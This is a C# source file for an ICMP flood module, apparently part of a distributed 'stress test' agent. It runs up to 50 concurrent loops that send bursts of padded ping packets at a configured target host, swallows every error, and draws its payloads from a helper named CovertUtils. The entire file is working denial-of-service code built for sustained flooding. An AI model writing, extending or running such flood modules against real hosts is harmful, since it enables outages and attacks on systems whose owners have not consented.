using System.Net.NetworkInformation;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Modules.StressTest;

public class IcmpFlood : IStressMethod
{
    public string Name => "ICMP Flood";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var tasks = new List<Task>();
        var threads = Math.Min(config.ThreadsPerAgent / 10, 50);
        for (int i = 0; i < threads; i++)
            tasks.Add(IcmpLoop(config, rpt, ct));
        await Task.WhenAll(tasks);
    }

    private async Task IcmpLoop(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        using var ping = new Ping();

        while (!ct.IsCancellationRequested)
        {
            try
            {
                var payload = CovertUtils.RandomPayload(32, Math.Min(config.PacketSize, 1472));
                var burst = new List<Task>();
                for (int i = 0; i < 10 && !ct.IsCancellationRequested; i++)
                {
                    burst.Add(ping.SendPingAsync(config.TargetHost, 1000, payload).ContinueWith(_ =>
                    {
                        rpt.IncrementPackets();
                        rpt.IncrementBytes(payload.Length);
                    }, ct));
                }
                await Task.WhenAll(burst);
            }
            catch { }
        }
    }
}
